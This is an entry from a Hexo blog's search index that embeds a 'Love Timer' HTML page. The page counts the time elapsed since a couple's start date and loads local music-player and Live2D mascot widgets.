        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><!DOCTYPE html><html lang="zh-CN"><head>    <meta charset="utf-8">    <meta name="viewport" content="width=device-width">    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    <meta name="renderer" content="webkit">    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">    <title>Love Timer</title>    <style>        body {            -webkit-font-smoothing: antialiased;            font-family: Helvetica Neue, Helvetica, Hiragino Sans GB, Microsoft YaHei, Arial, sans-serif;            background-image: url('bg.jpg');            font-size: 85%;            margin: 0;        }                h2 {            font-size: 500%;            font-weight: 500;        }                .content {            position: absolute;            width: 100%;            top: 40%;            transform: translate(0, -50%);            text-align: center;        }                .timer {            font-size: 220%;            line-height: 1.5;            margin: 1em 0;        }                .timer b {            color: rgb(253, 99, 125);        }    </style><meta name="generator" content="Hexo 4.2.0"></head><body>    <div class="content">        <h2>We have been together for</h2>        <div class="timer">            <b id="d"></b> Days <b id="h"></b> Hours <b id="m"></b> Minutes <b id="s"></b> Seconds        </div>    </div>    <script>        function timer() {            var start = new Date(2020, 11, 11); // 20**·??·??            var t = new Date() - start;            var h = ~~(t / 1000 / 60 / 60 % 24);            if (h < 10) {                h = "0" + h;            }            var m = ~~(t / 1000 / 60 % 60);            if (m < 10) {                m = "0" + m;            }            var s = ~~(t / 1000 % 60);            if (s < 10) {                s = "0" + s;            }            document.getElementById('d').innerHTML = ~~(t / 1000 / 60 / 60 / 24);            document.getElementById('h').innerHTML = h;            document.getElementById('m').innerHTML = m;            document.getElementById('s').innerHTML = s;        }        timer();        setInterval(timer, 1000);    </script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":250},"mobile":{"show":true},"react":{"opacity":1},"log":false});</script></body></html>]]></content>
      
    </entry>
    
    
  
</search>
